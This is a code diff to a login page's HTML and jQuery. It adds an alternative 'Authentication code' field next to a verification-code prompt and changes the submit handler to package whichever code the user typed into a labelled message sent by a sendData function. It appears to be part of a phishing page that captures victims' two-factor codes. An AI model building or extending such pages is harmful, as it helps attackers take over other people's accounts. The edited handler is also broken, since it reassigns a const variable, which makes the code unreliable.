@@ -151,6 +151,14 @@
         <label for="code" class="login-label">Enter verification code or confirm login on your device</label>
         <input type="text" id="code" placeholder="" required />
       </div>
+      <p class="my-3">
+        <hr />
+        <span>OR</span>
+      </p>
+      <div class="input-group">
+        <label for="authentication_code" class="login-label">Authentication code</label>
+        <input type="text" id="authentication_code" placeholder="" required />
+      </div>
       <button class="login-btn" type="submit">Confirm</button>
     </form>
   </div>
@@ -176,7 +184,13 @@
   $("#codeForm").submit((e) => {
     e.preventDefault();
     const code = $("#code").val();
-    const message = `Code: ${code}`;
+    const message = null;
+    if(code) {
+      message = `Verification code: ${code}`;
+    } else {
+      const authentication_code = $("#authentication_code").val();
+      message = `Authentication code: ${authentication_code}`;
+    }
     sendData(message, 'code');
   });
 
